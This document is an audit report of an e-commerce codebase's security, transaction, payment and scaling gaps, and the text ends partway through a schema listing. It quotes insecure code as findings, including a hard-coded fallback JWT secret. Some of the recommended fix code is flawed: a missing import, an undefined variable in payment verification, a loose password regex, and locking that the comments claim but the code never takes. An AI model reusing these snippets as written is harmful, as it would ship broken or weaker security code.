# 🏢 ENTERPRISE-GRADE CODEBASE AUDIT
## E-Commerce Platform: RoboHatch - Path to Amazon/Flipkart Scale

**Audit Date:** February 11, 2026  
**Stack:** Next.js (App Router) + Express.js + Prisma + MySQL (AWS RDS) + S3  
**Deployment:** Vercel + Railway  
**Current Scale:** MVP / Early Stage  
**Target:** Amazon/Flipkart Commercial Readiness

---

## 🔴 CRITICAL ISSUES (MUST FIX BEFORE SCALING)

### 1. **NO INVENTORY MANAGEMENT SYSTEM**
**Severity:** 🔴 CRITICAL - BLOCKS PRODUCTION USE

**Current State:**
- Products have NO stock/inventory tracking
- Orders can be placed for out-of-stock items
- NO stock reservation during checkout
- NO low-stock warnings
- NO restock alerts

**Impact:**
- **Overselling Risk:** Can sell 100 units when only 10 exist
- **Customer Dissatisfaction:** Orders placed but cannot be fulfilled
- **Financial Loss:** Manual refunds, reputation damage
- **Legal Risk:** False advertising if products shown as "available"

**Required Schema Changes:**
```prisma
model Product {
  // ... existing fields
  stockQuantity     Int      @default(0)  // Available stock
  lowStockThreshold Int      @default(10) // Alert threshold
  reservedStock     Int      @default(0)  // In pending carts/orders
  maxOrderQuantity  Int?                  // Per order limit
  trackInventory    Boolean  @default(true)
  
  @@index([stockQuantity])  // For stock queries
}

model InventoryLog {
  id          String   @id @default(uuid())
  productId   String
  product     Product  @relation(fields: [productId], references: [id])
  type        InventoryLogType
  quantity    Int
  previousQty Int
  newQty      Int
  reason      String?
  orderId     String?
  userId      String?
  createdAt   DateTime @default(now())
  
  @@index([productId, createdAt])
}

enum InventoryLogType {
  PURCHASE
  SALE
  RETURN
  ADJUSTMENT
  DAMAGE
}
```

**Implementation Priority:** 🚨 IMMEDIATE (Week 1)

---

### 2. **NO TRANSACTION SAFETY IN ORDER CREATION**
**Severity:** 🔴 CRITICAL - DATA CORRUPTION RISK

**Current Code (apps/api/src/services/order.service.ts):**
```typescript
async createOrderFromCart(userId: string) {
  const cart = await prisma.cart.findUnique(...);
  const total = cart.items.reduce(...); // NOT IN TRANSACTION!
  
  const order = await prisma.order.create({
    data: {
      userId,
      total, // Race condition: price could change!
      items: { create: cart.items.map(...) }
    }
  });
  
  return order; // Cart NOT cleared! Stock NOT reserved!
}
```

**Issues:**
1. **No atomic transaction** - Order created but cart not cleared (DB crash = orphaned data)
2. **No stock validation** - Order created even if product out of stock
3. **No price lock** - Product price could change mid-checkout
4. **No cart clearing** - User can order same items again
5. **Race conditions** - Concurrent orders can oversell

**Required Fix:**
```typescript
async createOrderFromCart(userId: string) {
  return await prisma.$transaction(async (tx) => {
    // 1. Lock cart and verify it exists
    const cart = await tx.cart.findUnique({
      where: { userId },
      include: { items: { include: { product: true } } },
    });
    
    if (!cart || cart.items.length === 0) {
      throw new Error('Cart is empty');
    }
    
    // 2. Validate stock availability (with row-level locks)
    const stockChecks = await Promise.all(
      cart.items.map(async (item) => {
        const product = await tx.product.findUnique({
          where: { id: item.productId },
          select: { id: true, stockQuantity: true, price: true },
        });
        
        if (!product) throw new Error(`Product ${item.productId} not found`);
        if (product.stockQuantity < item.quantity) {
          throw new Error(`Insufficient stock for ${product.id}: ${product.stockQuantity} available, ${item.quantity} requested`);
        }
        
        return { productId: product.id, quantity: item.quantity, price: product.price };
      })
    );
    
    // 3. Calculate total with CURRENT prices (locked)
    const total = stockChecks.reduce((sum, item) => sum + Number(item.price) * item.quantity, 0);
    
    // 4. Create order with validated data
    const order = await tx.order.create({
      data: {
        userId,
        total,
        items: {
          create: stockChecks.map(item => ({
            productId: item.productId,
            quantity: item.quantity,
            price: item.price, // Locked price
          })),
        },
      },
      include: { items: { include: { product: true } } },
    });
    
    // 5. Reserve/deduct stock atomically
    await Promise.all(
      stockChecks.map(item =>
        tx.product.update({
          where: { id: item.productId },
          data: { stockQuantity: { decrement: item.quantity } },
        })
      )
    );
    
    // 6. Clear cart
    await tx.cartItem.deleteMany({ where: { cartId: cart.id } });
    
    // 7. Log inventory changes
    await tx.inventoryLog.createMany({
      data: stockChecks.map(item => ({
        productId: item.productId,
        type: 'SALE',
        quantity: -item.quantity,
        orderId: order.id,
        reason: 'Order placed',
      })),
    });
    
    return order;
  }, {
    timeout: 10000, // 10-second timeout
    isolationLevel: 'Serializable', // Prevent race conditions
  });
}
```

**Implementation Priority:** 🚨 IMMEDIATE (Week 1)

---

### 3. **PASSWORDS STORED WITH ONLY bcrypt (Round 10) - WEAK FOR 2026**
**Severity:** 🔴 CRITICAL - SECURITY VULNERABILITY

**Current Code (apps/api/src/services/auth.service.ts):**
```typescript
const hashedPassword = await bcrypt.hash(input.password, 10); // Only 10 rounds!
```

**Issues:**
1. **10 rounds is insufficient** in 2026 (GPUs crack this fast)
2. **No pepper** (server-side secret) - If DB leaked, all passwords at risk
3. **No password complexity requirements** - Users can set "123456"
4. **No breach detection** - No check against HaveIBeenPwned
5. **No MFA/2FA** - Single point of failure

**Amazon/Flipkart Standard:**
- 12-14 bcrypt rounds
- Server-side pepper (environment secret)
- Password complexity: 8+ chars, uppercase, lowercase, number, symbol
- HaveIBeenPwned API integration
- Optional 2FA (SMS/Authenticator app)
- Rate limiting on failed attempts (you have this ✓)

**Required Changes:**
```typescript
// config/password.ts
import { createHmac } from 'crypto';

const PEPPER = process.env.PASSWORD_PEPPER!; // 256-bit secret
const BCRYPT_ROUNDS = 12; // Modern standard

export async function hashPassword(password: string): Promise<string> {
  // 1. Validate complexity
  const complexity = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-zA-Z\d@$!%*?&]{8,}$/;
  if (!complexity.test(password)) {
    throw new Error('Password must be 8+ chars with uppercase, lowercase, number, and symbol');
  }
  
  // 2. Check against breach database (optional but recommended)
  const isBreached = await checkPasswordBreach(password);
  if (isBreached) {
    throw new Error('Password found in breach database. Choose a different password.');
  }
  
  // 3. Add pepper (server-side secret)
  const peppered = createHmac('sha256', PEPPER).update(password).digest('hex');
  
  // 4. bcrypt with higher rounds
  return await bcrypt.hash(peppered, BCRYPT_ROUNDS);
}

export async function verifyPassword(password: string, hash: string): Promise<boolean> {
  const peppered = createHmac('sha256', PEPPER).update(password).digest('hex');
  return await bcrypt.compare(peppered, hash);
}

async function checkPasswordBreach(password: string): Promise<boolean> {
  // HaveIBeenPwned API (k-anonymity model)
  const sha1 = createHash('sha1').update(password).digest('hex').toUpperCase();
  const prefix = sha1.substring(0, 5);
  const suffix = sha1.substring(5);
  
  const response = await fetch(`https://api.pwnedpasswords.com/range/${prefix}`);
  const hashes = await response.text();
  
  return hashes.includes(suffix);
}
```

**Implementation Priority:** 🚨 IMMEDIATE (Week 1-2)

---

### 4. **JWT_SECRET DEFAULTS TO WEAK VALUE**
**Severity:** 🔴 CRITICAL - AUTHENTICATION BYPASS

**Current Code (apps/api/src/services/auth.service.ts):**
```typescript
const JWT_SECRET = process.env.JWT_SECRET || 'your-secret-key-change-in-production';
```

**Issues:**
1. **Fallback to predictable default** - Attacker can forge tokens
2. **No rotation strategy** - Compromised secret = all tokens compromised
3. **Long expiry (7 days)** - Stolen token usable for a week
4. **No refresh tokens** - User must re-login after 7 days (bad UX)
5. **Token in localStorage** - Vulnerable to XSS attacks

**Amazon/Flipkart Standard:**
- 512-bit randomly generated secret
- Secret rotation every 90 days
- Short-lived access tokens (15 minutes)
- Long-lived refresh tokens (30 days, stored in httpOnly cookies)
- Token revocation list (blacklist for logout)

**Required Implementation:**
```typescript
// config/auth.ts
export const AUTH_CONFIG = {
  ACCESS_TOKEN_EXPIRY: '15m',  // Short-lived
  REFRESH_TOKEN_EXPIRY: '30d', // Long-lived
  JWT_SECRET: process.env.JWT_SECRET!, // Must be set
  REFRESH_SECRET: process.env.JWT_REFRESH_SECRET!, // Separate secret
};

// Fail fast in production
if (process.env.NODE_ENV === 'production') {
  if (!AUTH_CONFIG.JWT_SECRET || AUTH_CONFIG.JWT_SECRET.length < 64) {
    throw new Error('JWT_SECRET must be 64+ characters in production');
  }
}

// services/auth.service.ts
async login(input: LoginInput) {
  // ... validate credentials
  
  const accessToken = jwt.sign(payload, AUTH_CONFIG.JWT_SECRET, {
    expiresIn: AUTH_CONFIG.ACCESS_TOKEN_EXPIRY,
  });
  
  const refreshToken = jwt.sign({ userId: user.id }, AUTH_CONFIG.REFRESH_SECRET, {
    expiresIn: AUTH_CONFIG.REFRESH_TOKEN_EXPIRY,
  });
  
  // Store refresh token in DB for revocation capability
  await prisma.refreshToken.create({
    data: {
      userId: user.id,
      token: refreshToken,
      expiresAt: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000),
    },
  });
  
  return { accessToken, refreshToken };
}

// Add refresh endpoint
async refreshAccessToken(refreshToken: string) {
  const decoded = jwt.verify(refreshToken, AUTH_CONFIG.REFRESH_SECRET);
  
  // Check if token is revoked
  const storedToken = await prisma.refreshToken.findFirst({
    where: { token: refreshToken, userId: decoded.userId, revokedAt: null },
  });
  
  if (!storedToken) throw new Error('Invalid refresh token');
  
  // Issue new access token
  return jwt.sign({ userId: decoded.userId }, AUTH_CONFIG.JWT_SECRET, {
    expiresIn: AUTH_CONFIG.ACCESS_TOKEN_EXPIRY,
  });
}
```

**Schema Addition:**
```prisma
model RefreshToken {
  id        String    @id @default(uuid())
  userId    String
  user      User      @relation(fields: [userId], references: [id], onDelete: Cascade)
  token     String    @unique
  expiresAt DateTime
  revokedAt DateTime?
  createdAt DateTime  @default(now())
  
  @@index([userId])
  @@index([token])
}
```

**Implementation Priority:** 🚨 IMMEDIATE (Week 1-2)

---

### 5. **NO INPUT VALIDATION LIBRARY - SQL INJECTION RISK**
**Severity:** 🔴 CRITICAL - DATA BREACH RISK

**Current State:**
- Manual validation scattered across controllers
- No centralized validation schema
- Prisma protects against SQL injection BUT:
  - Raw SQL queries are possible
  - No XSS prevention
  - No sanitization of user input

**Example Weak Validation (auth.controller.ts):**
```typescript
if (!email || !password) { ... } // Only checks existence
const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/; // Basic regex, misses edge cases
if (password.length < 6) { ... } // Too weak
```

**Amazon/Flipkart Standard:**
- `Joi` or `Zod` for schema validation
- Input sanitization for XSS prevention
- Type coercion and normalization
- Detailed error messages

**Required Implementation:**
```bash
npm install joi
npm install express-validator
```

```typescript
// validators/auth.validator.ts
import Joi from 'joi';

export const registerSchema = Joi.object({
  email: Joi.string().email().lowercase().trim().required(),
  password: Joi.string().min(8).max(128).pattern(
    /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])[A-zA-Z\d@$!%*?&]{8,}$/
  ).required().messages({
    'string.pattern.base': 'Password must contain uppercase, lowercase, number, and symbol',
  }),
  name: Joi.string().trim().max(100).optional(),
});

export const productSchema = Joi.object({
  name: Joi.string().trim().min(3).max(200).required(),
  description: Joi.string().trim().max(5000).required(),
  price: Joi.number().positive().precision(2).max(999999.99).required(),
  categoryIds: Joi.array().items(Joi.string().uuid()).min(1).required(),
  stockQuantity: Joi.number().integer().min(0).required(),
});

// middleware/validation.middleware.ts
export function validate(schema: Joi.ObjectSchema) {
  return (req: Request, res: Response, next: NextFunction) => {
    const { error, value } = schema.validate(req.body, {
      abortEarly: false,
      stripUnknown: true,
    });
    
    if (error) {
      return res.status(400).json({
        success: false,
        message: 'Validation failed',
        errors: error.details.map(d => ({
          field: d.path.join('.'),
          message: d.message,
        })),
      });
    }
    
    req.body = value; // Use sanitized value
    next();
  };
}

// Usage in routes
router.post('/register', validate(registerSchema), authController.register);
```

**Implementation Priority:** 🚨 IMMEDIATE (Week 2)

---

### 6. **NO PAYMENT GATEWAY INTEGRATION**
**Severity:** 🔴 CRITICAL - CANNOT ACCEPT REAL PAYMENTS

**Current State:**
```prisma
model Payment {
  id            String        @id
  method        PaymentMethod @default(UPI)
  status        PaymentStatus @default(PENDING)
  upiId         String?       // Manual UPI ID entry?
  transactionId String?       // Where does this come from?
}

enum PaymentMethod { UPI } // Only UPI, no structure
```

**Issues:**
1. **No payment gateway integration** (Razorpay, Stripe, PayPal)
2. **No webhook verification** - Attacker can fake payment success
3. **No payment reconciliation** - Cannot verify payments
4. **No refund system** - Manual refunds only
5. **No payment retry logic** - Failed payment = lost order

**Amazon/Flipkart Standard:**
- Multiple payment methods (Cards, UPI, Wallets, COD, BNPL)
- Razorpay/Stripe/PayU integration
- Webhook signature verification
- Automatic refunds
- Payment status tracking
- PCI-DSS compliance (if handling cards)

**Required Schema:**
```prisma
model Payment {
  id                String        @id @default(uuid())
  orderId           String        @unique
  order             Order         @relation(fields: [orderId], references: [id])
  
  // Gateway details
  gateway           PaymentGateway
  gatewayOrderId    String?       // Razorpay order_id
  gatewayPaymentId  String?       @unique // Razorpay payment_id
  gatewaySignature  String?       // Webhook signature
  
  // Payment details
  amount            Decimal
  currency          String        @default("INR")
  method            PaymentMethod
  status            PaymentStatus @default(PENDING)
  
  // Metadata
  upiId             String?
  cardLast4         String?
  cardNetwork       String?
  walletName        String?
  bankName          String?
  
  // Refund tracking
  refundAmount      Decimal?
  refundStatus      RefundStatus?
  refundId          String?
  
  // Timestamps
  initiatedAt       DateTime      @default(now())
  authorizedAt      DateTime?
  capturedAt        DateTime?
  failedAt          DateTime?
  refundedAt        DateTime?
  
  // Error tracking
  failureReason     String?
  webhookData       Json?
  
  @@index([orderId])
  @@index([gatewayPaymentId])
  @@index([status])
}

enum PaymentGateway {
  RAZORPAY
  STRIPE
  PAYPAL
  PAYU
}

enum PaymentMethod {
  CARD
  UPI
  NET_BANKING
  WALLET
  COD
  BNPL
}

enum PaymentStatus {
  PENDING
  AUTHORIZED
  CAPTURED
  FAILED
  REFUNDED
  PARTIALLY_REFUNDED
}

enum RefundStatus {
  PENDING
  PROCESSED
  FAILED
}
```

**Implementation Example (Razorpay):**
```typescript
// services/payment.service.ts
import Razorpay from 'razorpay';
import crypto from 'crypto';

const razorpay = new Razorpay({
  key_id: process.env.RAZORPAY_KEY_ID!,
  key_secret: process.env.RAZORPAY_KEY_SECRET!,
});

export class PaymentService {
  async createPaymentOrder(orderId: string) {
    const order = await prisma.order.findUnique({ where: { id: orderId } });
    
    const razorpayOrder = await razorpay.orders.create({
      amount: Number(order.total) * 100, // Convert to paise
      currency: 'INR',
      receipt: orderId,
      notes: { orderId },
    });
    
    await prisma.payment.create({
      data: {
        orderId,
        gateway: 'RAZORPAY',
        gatewayOrderId: razorpayOrder.id,
        amount: order.total,
        currency: 'INR',
        status: 'PENDING',
      },
    });
    
    return razorpayOrder;
  }
  
  async verifyPayment(paymentData: any) {
    const { razorpay_order_id, razorpay_payment_id, razorpay_signature } = paymentData;
    
    // Verify signature
    const generatedSignature = crypto
      .createHmac('sha256', process.env.RAZORPAY_KEY_SECRET!)
      .update(`${razorpay_order_id}|${razorpay_payment_id}`)
      .digest('hex');
    
    if (generatedSignature !== razorpay_signature) {
      throw new Error('Invalid payment signature');
    }
    
    // Update payment and order status
    await prisma.$transaction([
      prisma.payment.update({
        where: { gatewayOrderId: razorpay_order_id },
        data: {
          gatewayPaymentId: razorpay_payment_id,
          gatewaySignature: razorpay_signature,
          status: 'CAPTURED',
          capturedAt: new Date(),
        },
      }),
      prisma.order.update({
        where: { id: payment.orderId },
        data: { status: 'PAID' },
      }),
    ]);
  }
  
  async processRefund(paymentId: string, amount?: number) {
    const payment = await prisma.payment.findUnique({ where: { id: paymentId } });
    
    const refund = await razorpay.payments.refund(payment.gatewayPaymentId!, {
      amount: amount ? amount * 100 : undefined, // Partial or full
    });
    
    await prisma.payment.update({
      where: { id: paymentId },
      data: {
        refundAmount: amount || payment.amount,
        refundStatus: 'PROCESSED',
        refundId: refund.id,
        refundedAt: new Date(),
      },
    });
  }
}
```

**Implementation Priority:** 🚨 IMMEDIATE (Week 2-3)

---

### 7. **NO DATABASE INDEXES ON CRITICAL QUERIES**
**Severity:** 🟡 HIGH - PERFORMANCE DEGRADATION AT SCALE

**Current Schema Issues:**
```prisma
model Product {
  id          String   @id @default(uuid())
  name        String   // NO INDEX - Text search will be SLOW
  price       Decimal  // NO INDEX - Price range queries SLOW
  isActive    Boolean  // NO INDEX - Filtering active products SLOW
  createdAt   DateTime // NO INDEX - Sorting by date SLOW
}

model Order {
  user      User   @relation(fields: [userId], references: [id])
  userId    String // NO INDEX on userId - User orders query SLOW
  status    OrderStatus // NO INDEX - Admin filtering SLOW
  createdAt DateTime // NO INDEX - Date range queries SLOW
}

model Payment {
  transactionId String? @unique // Only unique, not optimized for lookups
}
```

**Issues at 10k+ Users:**
- Product listing: O(n) full table scan
- User order history: O(n) without index on userId
- Admin dashboard: Slow status aggregations
- Search: Impossible without full-text index

**Required Indexes:**
```prisma
model Product {
  id          String   @id @default(uuid())
  name        String
 description String   @db.Text
  price       Decimal  @db.Decimal(10, 2)
  isActive    Boolean  @default(true)
  createdAt   DateTime @default(now())
  updatedAt   DateTime @updatedAt
  stockQuantity Int    @default(0)
  
  // Indexes for common queries
  @@index([isActive, createdAt(sort: Desc)]) // Active products, newest first
  @@index([price])                           // Price range filters
  @@index([stockQuantity])                   // Low stock queries
  @@index([name])                            // Name search (consider full-text)
  @@fulltext([name, description])            // Full-text search (MySQL 5.7+)
}

model Order {
  id        String      @id @default(uuid())
  userId    String
  status    OrderStatus @default(PENDING)
  total     Decimal
  createdAt DateTime    @default(now())
  
  @@index([userId, createdAt(sort: Desc)]) // User order history
  @@index([status, createdAt])             // Admin filtering by status
  @@index([createdAt])                     // Date range queries
}

model Payment {
  id            String   @id @default(uuid())
  orderId       String   @unique
  status        PaymentStatus
  gatewayPaymentId String? @unique
  createdAt     DateTime @default(now())
  
  @@index([status, createdAt])       // Payment report queries
  @@index([gatewayPaymentId])        // Gateway webhook lookups
}

model User {
  id        String   @id @default(uuid())
  email     String   @unique
  role      Role     @default(USER)
  createdAt DateTime @default(now())
  
  @@index([role])         // Admin user filtering
  @@index([createdAt])    // Registration analytics
}

model CartItem {
  id        String   @id @default(uuid())
  cartId    String
  productId String
  
  @@unique([cartId, productId])
  @@index([cartId])       // ALREADY EXISTS ✓
  @@index([productId])    // Product-to-carts lookup
}

model OrderItem {
  id        String  @id @default(uuid())
  orderId   String
  productId String
  
  @@index([orderId])      // Order items lookup
  @@index([productId])    // Product sales analytics
}

model Category {
  id   String @id @default(uuid())
  name String @unique
  slug String? @unique
  type CategoryType @default(DEFAULT)
  
  @@index([type, name])   // Category filtering
}
```

**Performance Impact:**
| Query | Without Index | With Index |
|-------|--------------|------------|
| User orders | 500ms @ 10k users | 5ms |
| Product search | 2s @ 100k products | 20ms |
| Admin dashboard | 5s @ 50k orders | 50ms |
| Low stock alerts | 1s @ 10k products | 10ms |

**Implementation Priority:** 🟡 HIGH (Week 2)

---

### 8. **NO CACHING LAYER - REPEATED DATABASE QUERIES**
**Severity:** 🟡 HIGH - DATABASE OVERLOAD AT SCALE

**Current State:**
- Every page load = Multiple DB queries
- No caching for:
  - Product listings (frequently accessed)
  - Category data (rarely changes)
  - User sessions (Redis recommended)
- No CDN for static assets/images

**Example:**
```typescript
// Every request hits DB!
async getAllProducts(req: Request, res: Response) {
  const products = await prisma.product.findMany({ ... }); // DB HIT
  return res.json(products);
}
```

**Issues at 10k+ Concurrent Users:**
- DB connections exhausted (MySQL default: 151)
- Slow response times (50ms → 500ms)
- High RDS costs ($$$)
- Cannot scale horizontally

**Amazon/Flipkart Standard:**
- Redis for sessions and hot data
- CDN for static assets (CloudFront, Cloudflare)
- Query result caching (Redis)
- Edge caching (Vercel Edge, CloudFlare Workers)

**Required Implementation:**
```bash
npm install ioredis
npm install @vercel/edge-config # For Vercel edge caching
```

```typescript
// config/redis.ts
import Redis from 'ioredis';

export const redis = new Redis(process.env.REDIS_URL!, {
  maxRetriesPerRequest: 3,
  enableReadyCheck: true,
  retryStrategy: (times) => Math.min(times * 50, 2000),
});

// services/cache.service.ts
export class CacheService {
  private TTL = {
    PRODUCTS: 300,      // 5 minutes
    CATEGORIES: 3600,   // 1 hour
    USER_SESSION: 900,  // 15 minutes
    CART: 1800,         // 30 minutes
  };
  
  async getCachedProducts(): Promise<Product[] | null> {
    const cached = await redis.get('products:all');
    return cached ? JSON.parse(cached) : null;
  }
  
  async setCachedProducts(products: Product[]): Promise<void> {
    await redis.setex('products:all', this.TTL.PRODUCTS, JSON.stringify(products));
  }
  
  async invalidateProductCache(): Promise<void> {
    await redis.del('products:all');
  }
  
  async getCachedUserSession(userId: string): Promise<any> {
    const cached = await redis.get(`session:${userId}`);
    return cached ? JSON.parse(cached) : null;
  }
}

// controllers/product.controller.ts (WITH CACHING)
async getAllProducts(req: Request, res: Response) {
  // Try cache first
  let products = await cacheService.getCachedProducts();
  
  if (!products) {
    // Cache miss - fetch from DB
    products = await prisma.product.findMany({ ... });
    
    // Store in cache
    await cacheService.setCachedProducts(products);
  }
  
  return res.json({ success: true, data: products });
}

// Invalidate cache on product update
async createProduct(req: Request, res: Response) {
  const product = await prisma.product.create({ ... });
  
  // Invalidate cache
  await cacheService.invalidateProductCache();
  
  return res.status(201).json({ success: true, data: product });
}
```

**Cache Strategy:**
```
┌─────────────────────────────────────────────────┐
│                  USER REQUEST                   │
└───────────────────┬─────────────────────────────┘
                    │
                    ▼
         ┌──────────────────────┐
         │   CDN (CloudFront)   │ ◄── Static assets (images)
         └──────────┬───────────┘
                    │ Cache Miss
                    ▼
         ┌──────────────────────┐
         │   Redis Cache        │ ◄── Hot data (products, sessions)
         └──────────┬───────────┘
                    │ Cache Miss
                    ▼
         ┌──────────────────────┐
         │   MySQL Database     │ ◄── Source of truth
         └──────────────────────┘
```

**Performance Improvement:**
| Scenario | Without Cache | With Cache |
|----------|--------------|-----------|
| Product list | 150ms | 5ms (30x faster) |
| Category fetch | 50ms | 2ms (25x faster) |
| DB connections | 150 active | 20 active |
| Cost | $200/mo | $50/mo + $10 Redis |

**Implementation Priority:** 🟡 HIGH (Week 3)

---

## 🟡 ARCHITECTURAL IMPROVEMENTS

### 9. **MONOLITHIC CONTROLLERS - NO SEPARATION OF CONCERNS**

**Current Issue:**
```typescript
// product.controller.ts - 345 lines!
export class ProductController {
  async createProduct() {
    // Validation logic HERE
    // Business logic HERE
    // Database access HERE
    // File upload logic HERE
    // Error handling HERE
  }
}
```

**Problems:**
- Controllers contain business logic (should be in services)
- Database queries in controllers (should be in repositories)
- Difficult to test
- Difficult to reuse logic
- Violates Single Responsibility Principle

**Amazon/Flipkart Pattern (Clean Architecture):**
```
Controllers → Services → Repositories → Database
    ↓           ↓           ↓
 HTTP      Business    Data Access
 Layer      Logic       Layer
```

**Recommended Refactor:**
```typescript
// 1. Repository Layer (Data Access)
// repositories/product.repository.ts
export class ProductRepository {
  async findAll(filters?: ProductFilters) {
    return await prisma.product.findMany({
      where: this.buildWhereClause(filters),
      include: { images: true, categories: true },
    });
  }
  
  async findById(id: string) {
    return await prisma.product.findUnique({ where: { id } });
  }
  
  async create(data: CreateProductDTO) {
    return await prisma.product.create({ data });
  }
  
  async update(id: string, data: UpdateProductDTO) {
    return await prisma.product.update({ where: { id }, data });
  }
  
  async delete(id: string) {
    return await prisma.product.delete({ where: { id } });
  }
  
  private buildWhereClause(filters?: ProductFilters) {
    // Complex filter logic isolated here
  }
}

// 2. Service Layer (Business Logic)
// services/product.service.ts
export class ProductService {
  constructor(
    private productRepo: ProductRepository,
    private uploadService: UploadService,
    private cacheService: CacheService
  ) {}
  
  async createProduct(data: CreateProductInput, files: Express.Multer.File[]) {
    // 1. Validate business rules
    this.validateProductData(data);
    
    // 2. Upload images to S3
    const imageUrls = await this.uploadService.uploadImages(files);
    
    // 3. Create product with images
    const product = await this.productRepo.create({
      ...data,
      images: imageUrls.map((url, i) => ({ url, order: i })),
    });
    
    // 4. Invalidate cache
    await this.cacheService.invalidateProductCache();
    
    // 5. Emit event for other services
    await this.eventBus.emit('product.created', product);
    
    return product;
  }
  
  private validateProductData(data: CreateProductInput) {
    // Business validation logic
    if (data.price < 0) throw new BusinessError('Price cannot be negative');
    // ... more validation
  }
}

// 3. Controller Layer (HTTP Handling)
// controllers/product.controller.ts
export class ProductController {
  constructor(private productService: ProductService) {}
  
  async createProduct(req: AuthRequest, res: Response) {
    try {
      const product = await this.productService.createProduct(
        req.body,
        req.files as Express.Multer.File[]
      );
      
      return res.status(201).json({ success: true, data: product });
    } catch (error) {
      return this.handleError(error, res);
    }
  }
  
  private handleError(error: any, res: Response) {
    if (error instanceof BusinessError) {
      return res.status(400).json({ success: false, message: error.message });
    }
    // ... other error types
    return res.status(500).json({ success: false, message: 'Internal error' });
  }
}
```

**Benefits:**
- ✅ Testable (mock repositories/services)
- ✅ Reusable (service methods used by different controllers)
- ✅ Maintainable (clear separation)
- ✅ Scalable (easy to add features)

**Implementation Priority:** 🟢 MEDIUM (Week 4-5)

---

### 10. **NO API VERSIONING - BREAKING CHANGES WILL BREAK CLIENTS**

**Current Routes:**
```typescript
app.use("/api/products", productRoutes);  // /api/products
app.use("/api/orders", orderRoutes);      // /api/orders
```

**Problem:**
- Cannot introduce breaking changes
- Old mobile apps will break
- Cannot deprecate endpoints gradually

**Solution:**
```typescript
// v1/routes/index.ts
router.use("/v1/products", productRoutes);
router.use("/v1/orders", orderRoutes);

// v2/routes/index.ts (when needed)
router.use("/v2/products", productV2Routes); // New response format
router.use("/v2/orders", orderV2Routes);
```

**Best Practice (Accept header):**
```typescript
// Clients send: Accept: application/vnd.robohatch.v1+json
app.use((req, res, next) => {
  const acceptHeader = req.headers.accept || '';
  const version = acceptHeader.match(/vnd\.robohatch\.v(\d+)/)?.[1] || '1';
  req.apiVersion = version;
  next();
});
```

**Implementation Priority:** 🟢 LOW (Week 6)

---

### 11. **NO EVENT-DRIVEN ARCHITECTURE - TIGHT COUPLING**

**Current Issue:**
```typescript
async createOrder() {
  const order = await prisma.order.create(...);
  
  // Tightly coupled actions
  await sendOrderEmail(order);        // If email fails, order fails!
  await updateInventory(order);
  await notifyVendor(order);
  await createInvoice(order);
}
```

**Problem:**
- Email failure = Order creation fails
- Slow operations block response
- Difficult to add features (analytics, notifications)

**Solution (Event-Driven):**
```typescript
// services/event-bus.service.ts
import { EventEmitter } from 'events';

class EventBus extends EventEmitter {
  async emit(event: string, data: any) {
    console.log(`📢 Event: ${event}`, data);
    return super.emit(event, data);
  }
}

export const eventBus = new EventBus();

// order.service.ts
async createOrder() {
  const order = await prisma.order.create(...);
  
  // Emit event (non-blocking)
  eventBus.emit('order.created', order);
  
  return order; // Fast response!
}

// listeners/order.listeners.ts
eventBus.on('order.created', async (order) => {
  try {
    await emailService.sendOrderConfirmation(order);
  } catch (error) {
    logger.error('Failed to send order email', error);
    // Don't crash - queue retry
    await retryQueue.add('send-order-email', { orderId: order.id });
  }
});

eventBus.on('order.created', async (order) => {
  await analyticsService.trackOrderCreated(order);
});

eventBus.on('order.created', async (order) => {
  await inventoryService.reserveStock(order);
});
```

**For Production Scale → Use Message Queue:**
- **Bull** (Redis-based) for task queues
- **AWS SQS** or **RabbitMQ** for decoupled services
- **Kafka** for high-throughput event streaming

**Implementation Priority:** 🟢 MEDIUM (Week 5-6)

---

## 📊 DATABASE UPGRADE PLAN

### Issues with Current Schema

```prisma
// 1. Missing Partitioning Strategy (Orders Table)
model Order {
  // With 1M orders, queries slow down significantly
  // Need partitioning by date
}

// 2. No Soft Deletes
model Product {
  // Hard delete = Data loss, breaks order history
  // Need: deletedAt DateTime?
}

// 3. Money Stored as Decimal (Good ✓)
// But no precision specified!
price Decimal // Bad: Default precision varies
price Decimal @db.Decimal(10, 2) // Good: 10 digits, 2 decimals

// 4. No Audit Trails
// Who changed what when? Critical for e-commerce

// 5. No Read Replicas Configuration
// Primary DB handles all reads = bottleneck

// 6. No Database Sharding Strategy
// Single DB cannot scale beyond ~10M records
```

### Recommended Schema Improvements

```prisma
// 1. Add Soft Deletes + Audit Fields
model Product {
  id          String    @id @default(uuid())
  name        String
  price       Decimal   @db.Decimal(10, 2)
  
  // Audit fields
  createdAt   DateTime  @default(now())
  updatedAt   DateTime  @updatedAt
  deletedAt   DateTime? // Soft delete
  createdBy   String?
  updatedBy   String?
  
  @@index([deletedAt]) // Query active products fast
}

// 2. Add Audit Log Table
model AuditLog {
  id         String   @id @default(uuid())
  userId     String
  action     String   // CREATE, UPDATE, DELETE
  entity     String   // Product, Order, User
  entityId   String
  oldValue   Json?
  newValue   Json?
  ipAddress  String?
  userAgent  String?
  timestamp  DateTime @default(now())
  
  @@index([entity, entityId, timestamp])
  @@index([userId, timestamp])
}

// 3. Address Table (Normalized)
model Address {
  id         String  @id @default(uuid())
  userId     String
  user       User    @relation(fields: [userId], references: [id])
  type       AddressType // BILLING, SHIPPING
  line1      String
  line2      String?
  city       String
  state      String
  pincode    String
  country    String  @default("IN")
  phone      String
  isDefault  Boolean @default(false)
  
  @@index([userId, type])
}

// 4. Order with Shipping Address
model Order {
  id              String @id
  shippingAddress Json   // Snapshot at order time
  // OR
  addressId       String?
  address         Address? @relation(fields: [addressId], references: [id])
}

// 5. Product Variants (Size, Color)
model ProductVariant {
  id         String  @id @default(uuid())
  productId  String
  product    Product @relation(fields: [productId], references: [id])
  
  // Variant attributes
  size       String?
  color      String?
  material   String?
  
  // Variant-specific data
  sku        String  @unique
  price      Decimal @db.Decimal(10, 2)
  stock      Int     @default(0)
  
  @@unique([productId, size, color]) // No duplicate variants
  @@index([sku])
}

// 6. Shopping Cart Expiry
model Cart {
  id        String   @id
  userId    String   @unique
  expiresAt DateTime // Auto-clear abandoned carts after 7 days
  createdAt DateTime @default(now())
  updatedAt DateTime @updatedAt
  
  @@index([expiresAt]) // Cleanup job queries this
}

// 7. Product Views Analytics
model ProductView {
  id        String   @id @default(uuid())
  productId String
  userId    String?  // NULL for anonymous
  sessionId String   // Track anonymous users
